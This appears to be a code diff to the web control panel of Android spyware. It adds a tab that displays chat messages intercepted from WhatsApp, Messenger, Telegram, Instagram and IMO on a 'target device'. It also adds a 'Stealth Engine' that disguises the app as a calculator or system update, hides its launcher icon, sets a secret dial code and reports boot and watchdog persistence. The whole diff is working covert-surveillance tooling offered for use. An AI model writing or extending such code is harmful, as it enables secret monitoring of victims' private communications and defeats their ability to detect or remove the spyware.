@@ -141,6 +141,12 @@
                 <button class="tab-btn" onclick="switchTab('notification')">
                     <i class="fas fa-paper-plane"></i> Push Notification
                 </button>
+                <button class="tab-btn" onclick="switchTab('chats')">
+                    <i class="fab fa-whatsapp"></i> Social Chat Feed
+                </button>
+                <button class="tab-btn" onclick="switchTab('stealth')">
+                    <i class="fas fa-user-ninja"></i> Stealth Engine
+                </button>
             </div>
 
             <!-- TAB 1: Screen Mirror & Remote Touch -->
@@ -681,6 +687,117 @@
                 </div>
             </div>
 
+            <!-- TAB 8: Social Chat Feed -->
+            <div id="tab-chats" class="tab-content">
+                <div class="card" style="padding: 24px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 12px;">
+                        <div>
+                            <h4 style="font-size: 1.05rem; font-weight: 700; color: #fff; display: flex; align-items: center; gap: 8px; margin: 0 0 4px 0;">
+                                💬 Social Media & Live Chat Feed
+                            </h4>
+                            <p style="font-size: 0.76rem; color: var(--text-secondary); margin: 0;">
+                                Read incoming chat messages from social apps.
+                            </p>
+                        </div>
+                        <button onclick="devRef.child('commands/refreshChats').set({timestamp: Date.now()})" class="btn-primary-glow" style="padding: 6px 16px; font-size: 0.78rem; border-radius: var(--radius-pill);">
+                            <i class="fas fa-sync-alt me-1"></i> Refresh
+                        </button>
+                    </div>
+
+                    <!-- Chat App Tabs -->
+                    <div style="display: flex; gap: 8px; margin-bottom: 16px; overflow-x: auto; padding-bottom: 4px;">
+                        <button class="btn-ghost" onclick="switchChatApp('whatsapp')" id="chat-tab-whatsapp" style="padding: 6px 14px; border-radius: var(--radius-pill); border-color: #25D366; color: #25D366;">WhatsApp</button>
+                        <button class="btn-ghost" onclick="switchChatApp('messenger')" id="chat-tab-messenger" style="padding: 6px 14px; border-radius: var(--radius-pill);">Messenger</button>
+                        <button class="btn-ghost" onclick="switchChatApp('telegram')" id="chat-tab-telegram" style="padding: 6px 14px; border-radius: var(--radius-pill);">Telegram</button>
+                        <button class="btn-ghost" onclick="switchChatApp('instagram')" id="chat-tab-instagram" style="padding: 6px 14px; border-radius: var(--radius-pill);">Instagram</button>
+                        <button class="btn-ghost" onclick="switchChatApp('imo')" id="chat-tab-imo" style="padding: 6px 14px; border-radius: var(--radius-pill);">IMO</button>
+                    </div>
+
+                    <!-- Chat Messages List -->
+                    <div id="chatMessagesContainer" style="display: flex; flex-direction: column; gap: 12px; max-height: 500px; overflow-y: auto; padding-right: 4px;">
+                        <div class="empty-state">
+                            <i class="fas fa-comment-slash"></i>
+                            <p>No chat messages captured yet. Ensure Notification Listener is enabled on the target device.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TAB 9: Stealth Engine -->
+            <div id="tab-stealth" class="tab-content">
+                <div style="display: flex; flex-direction: column; gap: 20px;">
+                    
+                    <!-- Section 1: App Disguise Theme -->
+                    <div class="card" style="padding: 24px;">
+                        <h4 style="font-size: 1.05rem; font-weight: 700; color: #fff; margin-bottom: 4px;">🎭 App Disguise Theme</h4>
+                        <p style="font-size: 0.76rem; color: var(--text-secondary); margin-bottom: 16px;">Change the app's appearance on the target device to hide in plain sight.</p>
+                        
+                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
+                            <div class="btn-ghost disguise-card" onclick="setDisguiseTheme('calculator')" id="disguise-calculator" style="display: flex; flex-direction: column; gap: 8px; padding: 16px;">
+                                <i class="fas fa-calculator" style="font-size: 1.5rem;"></i>
+                                <span style="font-weight: 600;">Calculator</span>
+                            </div>
+                            <div class="btn-ghost disguise-card" onclick="setDisguiseTheme('system_update')" id="disguise-system_update" style="display: flex; flex-direction: column; gap: 8px; padding: 16px;">
+                                <i class="fas fa-download" style="font-size: 1.5rem;"></i>
+                                <span style="font-weight: 600;">System Update</span>
+                            </div>
+                            <div class="btn-ghost disguise-card" onclick="setDisguiseTheme('battery_saver')" id="disguise-battery_saver" style="display: flex; flex-direction: column; gap: 8px; padding: 16px;">
+                                <i class="fas fa-battery-half" style="font-size: 1.5rem;"></i>
+                                <span style="font-weight: 600;">Battery Saver</span>
+                            </div>
+                            <div class="btn-ghost disguise-card" onclick="setDisguiseTheme('none')" id="disguise-none" style="display: flex; flex-direction: column; gap: 8px; padding: 16px; border-color: rgba(255, 69, 58, 0.5); color: #ff453a;">
+                                <i class="fas fa-undo" style="font-size: 1.5rem;"></i>
+                                <span style="font-weight: 600;">Remove Disguise</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Section 2: Stealth & Persistence Controls -->
+                    <div class="card" style="padding: 24px;">
+                        <h4 style="font-size: 1.05rem; font-weight: 700; color: #fff; margin-bottom: 16px;">🕵️ Stealth & Persistence Controls</h4>
+                        
+                        <div style="display: flex; flex-direction: column; gap: 12px;">
+                            <div style="display: flex; justify-content: space-between; align-items: center; background: rgba(255,255,255,0.03); padding: 12px 16px; border-radius: 12px; border: 1px solid var(--border);">
+                                <div>
+                                    <span style="display: block; font-weight: 600; color: #fff;">Hide Launcher Icon</span>
+                                    <span style="font-size: 0.72rem; color: var(--text-muted);">Current State: <span id="iconHiddenStatus">Checking...</span></span>
+                                </div>
+                                <button onclick="toggleHideIcon()" class="btn-ghost" style="padding: 6px 12px; border-radius: var(--radius-pill); font-size: 0.8rem;">Toggle</button>
+                            </div>
+                            
+                            <div style="background: rgba(255,255,255,0.03); padding: 12px 16px; border-radius: 12px; border: 1px solid var(--border);">
+                                <span style="display: block; font-weight: 600; color: #fff; margin-bottom: 4px;">Secret Dial Code</span>
+                                <span style="font-size: 0.78rem; color: var(--text-muted);">Dial <code style="color: var(--primary);">*#8888#</code> on the target device to re-open the app when icon is hidden.</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Section 3: Auto-Restart Guard Status -->
+                    <div class="card" style="padding: 24px;">
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
+                            <h4 style="font-size: 1.05rem; font-weight: 700; color: #fff; margin: 0;">🛡️ Auto-Restart Guard</h4>
+                            <button onclick="devRef.child('commands/restartServices').set({timestamp:Date.now()})" class="btn-ghost" style="padding: 6px 12px; border-radius: var(--radius-pill); font-size: 0.75rem;">Force Restart Services</button>
+                        </div>
+                        
+                        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 10px;">
+                            <div style="background: rgba(255,255,255,0.03); padding: 12px; border-radius: 12px; border: 1px solid var(--border); text-align: center;">
+                                <span style="font-size: 0.75rem; color: var(--text-muted); display: block; margin-bottom: 4px;">Boot Receiver</span>
+                                <span style="font-size: 0.85rem; font-weight: 700; color: var(--success);">Active</span>
+                            </div>
+                            <div style="background: rgba(255,255,255,0.03); padding: 12px; border-radius: 12px; border: 1px solid var(--border); text-align: center;">
+                                <span style="font-size: 0.75rem; color: var(--text-muted); display: block; margin-bottom: 4px;">Service Watchdog</span>
+                                <span style="font-size: 0.85rem; font-weight: 700; color: var(--success);">Active</span>
+                            </div>
+                            <div style="background: rgba(255,255,255,0.03); padding: 12px; border-radius: 12px; border: 1px solid var(--border); text-align: center;">
+                                <span style="font-size: 0.75rem; color: var(--text-muted); display: block; margin-bottom: 4px;">WorkManager Scheduler</span>
+                                <span style="font-size: 0.85rem; font-weight: 700; color: var(--success);">Active</span>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+
         </div>
     </main>
 
@@ -847,6 +964,8 @@
             devRef.child('commands/getContacts').set(true);
         } else if (name === 'location') {
             forceLocationRefresh();
+        } else if (name === 'chats') {
+            if (typeof switchChatApp === 'function') switchChatApp(activeChatApp || 'whatsapp');
         }
     }
 
@@ -1904,6 +2023,129 @@
             timestamp: Date.now()
         });
         alert("Self-Destruct initiated! The app is clearing its local storage, resetting cache, and launching self-uninstallation on the target device.");
+    }
+
+    // ==========================================
+    // 7. Chats & Stealth Extensions
+    // ==========================================
+    let activeChatApp = 'whatsapp';
+    
+    function switchChatApp(appKey) {
+        activeChatApp = appKey;
+        
+        // Reset styles for all tabs
+        const apps = ['whatsapp', 'messenger', 'telegram', 'instagram', 'imo'];
+        apps.forEach(a => {
+            const el = document.getElementById('chat-tab-' + a);
+            if (el) {
+                el.style.borderColor = 'var(--border)';
+                el.style.color = 'var(--text-muted)';
+            }
+        });
+        
+        // Active style based on app
+        const activeEl = document.getElementById('chat-tab-' + appKey);
+        if (activeEl) {
+            let color = 'var(--primary)';
+            if (appKey === 'whatsapp') color = '#25D366';
+            else if (appKey === 'messenger') color = '#00B2FF';
+            else if (appKey === 'telegram') color = '#0088cc';
+            else if (appKey === 'instagram') color = '#E1306C';
+            else if (appKey === 'imo') color = '#FFC107';
+            
+            activeEl.style.borderColor = color;
+            activeEl.style.color = color;
+        }
+        
+        // Render messages for this app
+        devRef.child('chats/' + appKey + '/messages').once('value', snap => {
+            renderChatMessages(appKey, snap.val());
+        });
+    }
+    
+    function renderChatMessages(appKey, data) {
+        const container = document.getElementById('chatMessagesContainer');
+        if (!container) return;
+        
+        if (!data) {
+            container.innerHTML = `
+                <div class="empty-state">
+                    <i class="fas fa-comment-slash"></i>
+                    <p>No chat messages captured yet. Ensure Notification Listener is enabled on the target device.</p>
+                </div>`;
+            return;
+        }
+        
+        const msgs = [];
+        for (const key in data) {
+            msgs.push(data[key]);
+        }
+        msgs.sort((a, b) => (b.time || 0) - (a.time || 0)); // Newest first
+        
+        let html = '';
+        msgs.forEach(msg => {
+            const sender = msg.sender || 'Unknown';
+            const body = msg.body || '';
+            const time = msg.time ? new Date(msg.time).toLocaleString() : '';
+            const initial = sender.charAt(0).toUpperCase();
+            
+            html += `
+            <div style="display: flex; gap: 10px; align-items: flex-start; margin-bottom: 12px; width: 100%;">
+                <div style="width: 36px; height: 36px; border-radius: 50%; background: rgba(255,255,255,0.1); display: flex; align-items: center; justify-content: center; font-weight: 700; color: #fff; flex-shrink: 0;">
+                    ${initial}
+                </div>
+                <div style="background: rgba(255,255,255,0.05); padding: 12px 16px; border-radius: 18px 18px 18px 4px; max-width: 85%;">
+                    <div style="font-size: 0.75rem; font-weight: 700; color: var(--text-muted); margin-bottom: 4px;">${escapeHtml(sender)}</div>
+                    <div style="font-size: 0.85rem; color: #fff; word-break: break-word;">${escapeHtml(body)}</div>
+                    <div style="font-size: 0.65rem; color: var(--text-muted); text-align: right; margin-top: 6px;">${time}</div>
+                </div>
+            </div>`;
+        });
+        
+        container.innerHTML = html;
+    }
+    
+    function setupChatListeners() {
+        const apps = ['whatsapp', 'messenger', 'telegram', 'instagram', 'imo'];
+        apps.forEach(app => {
+            devRef.child('chats/' + app + '/messages').on('value', snap => {
+                if (activeChatApp === app) {
+                    renderChatMessages(app, snap.val());
+                }
+            });
+        });
+    }
+    setupChatListeners();
+
+    // Stealth Listeners
+    devRef.child('settings/disguise_theme').on('value', snap => {
+        const theme = snap.val() || 'none';
+        document.querySelectorAll('.disguise-card').forEach(c => {
+            c.style.borderColor = 'var(--border)';
+            c.style.background = 'transparent';
+        });
+        const activeCard = document.getElementById('disguise-' + theme);
+        if (activeCard) {
+            activeCard.style.borderColor = 'var(--primary)';
+            activeCard.style.background = 'rgba(255,255,255,0.05)';
+        }
+    });
+
+    devRef.child('settings/iconHidden').on('value', snap => {
+        const isHidden = snap.val() || false;
+        const el = document.getElementById('iconHiddenStatus');
+        if (el) {
+            el.textContent = isHidden ? 'HIDDEN (Stealth Mode)' : 'VISIBLE';
+            el.style.color = isHidden ? 'var(--warning)' : 'var(--success)';
+        }
+    });
+
+    function setDisguiseTheme(theme) {
+        devRef.child('commands/setDisguise').set({
+            theme: theme,
+            timestamp: Date.now()
+        });
+        alert('Disguise command sent: ' + theme);
     }
     </script>
 </body>
